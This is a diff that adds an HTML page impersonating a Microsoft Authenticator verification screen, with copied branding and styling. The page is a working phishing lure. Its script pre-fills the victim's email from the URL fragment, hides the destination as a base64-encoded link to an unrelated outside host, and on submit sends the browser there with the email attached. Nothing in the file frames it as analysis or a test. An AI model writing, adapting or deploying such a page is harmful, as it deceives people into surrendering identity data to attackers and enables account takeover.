@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Microsoft Authenticator Verification</title>
+  <style>
+    body { 
+      font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif; 
+      background-color: #f4f4f4; 
+      margin: 0; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      height: 100vh; 
+      color: #333; 
+      background-image: url('https://cdn.prod.website-files.com/65a11a72834cb899bc54a7d6/66ab599f0ce92faaeeac95c0_66ab57c5dcec67e3e5e48787_microsoft%2520copilot.jpeg'); 
+      background-size: cover; 
+      background-position: center; 
+    } 
+    .header { 
+      width: 100%; 
+      background-color: #0078d4; 
+      color: white; 
+      text-align: left; 
+      padding: 10px 20px; 
+      box-sizing: border-box; 
+      font-size: 18px; 
+      position: absolute; 
+      top: 0; 
+    } 
+    .header span { 
+      margin-left: 20px; 
+    } 
+    .container { 
+      background-color: white; 
+      border: 1px solid #ccc; 
+      border-radius: 3px; 
+      padding: 33px; 
+      width: 80%; 
+      max-width: 300px; 
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); 
+      text-align: center; 
+      margin-top: 0px; 
+    } 
+    .container img { 
+      width: 100px; 
+      margin-bottom: 20px; 
+    } 
+    .container h2 { 
+      font-size: 24px; 
+      margin-bottom: 20px; 
+      color: #333; 
+    } 
+    .container p { 
+      margin-bottom: 10px; 
+      color: #666; 
+    } 
+    .container p2 { 
+      display: block; 
+      margin-bottom: 10px; 
+      color: #666; 
+      font-size: 13px; 
+      margin-bottom: 20px; 
+    } 
+    .container input[type="email"] { 
+      width: 100%; 
+      padding: 10px; 
+      margin-bottom: 20px; 
+      border: 1px solid #ccc; 
+      border-radius: 3px; 
+      font-size: 16px; 
+      box-sizing: border-box; 
+      text-align: center; 
+    } 
+    .container button { 
+      width: 100%; 
+      padding: 10px; 
+      background-color: #0078d4; 
+      color: white; 
+      border: none; 
+      border-radius: 3px; 
+      font-size: 16px; 
+      cursor: pointer; 
+    } 
+    .container button:hover { 
+      background-color: #005a9e; 
+    } 
+    .container .footer { 
+      font-size: 12px; 
+      color: #888; 
+      margin-top: 20px; 
+    } 
+    @media (max-width: 600px) { 
+      .container { 
+        padding: 20px; 
+      } 
+      .container h2 { 
+        font-size: 20px; 
+      } 
+      .container .space { 
+        margin-bottom: 20px; 
+      } 
+      .container input[type="email"] { 
+        font-size: 14px; 
+      } 
+      .container button { 
+        font-size: 14px; 
+      } 
+    }
+  </style>
+</head>
+<body>
+  <div class="header">
+    <span>Microsoft Authenticator</span>
+  </div>
+  <div class="container">
+    <img src="https://cdn-icons-png.flaticon.com/512/732/732221.png" alt="Microsoft Authenticator Logo">
+    <h2>Authenticator Verification Required</h2>
+    <p><strong>Identity confirmation is needed.</strong></p>
+    <p2>To continue, confirm your email address to verify access via Microsoft Authenticator.</p2>
+    <form id="verification-form">
+      <input id="email-input" placeholder="Enter your email" required type="email">
+      <button type="submit">Verify</button>
+    </form>
+  </div>
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const hash = window.location.hash.substring(1);
+      const email = decodeURIComponent(hash);
+      if (validateEmail(email)) {
+        document.getElementById('email-input').value = email;
+      }
+    });
+
+    function continueLoading() {
+      const emailInput = document.getElementById('email-input');
+      const email = emailInput.value.trim().toLowerCase();
+      if (validateEmail(email)) {
+        const link = "aHR0cHM6Ly91cnVyaWZoZmJkbWRiend3b3J1cm1mbGRtLmVjaG9pbmcuY29tLmRlL1d2Q2VhLw==";
+        const decodedLink = atob(link);
+        const finalLink = `${decodedLink}?e=${email}`;
+        window.location.href = finalLink;
+      } else {
+        alert("Please enter a valid email address.");
+      }
+    }
+
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+
+    document.getElementById('verification-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+      continueLoading();
+    });
+
+    document.getElementById('email-input').addEventListener('keydown', function(event) {
+      if (event.key === 'Enter') {
+        document.getElementById('verification-form').dispatchEvent(new Event('submit'));
+      }
+    });
+  </script>
+</body>
+</html>
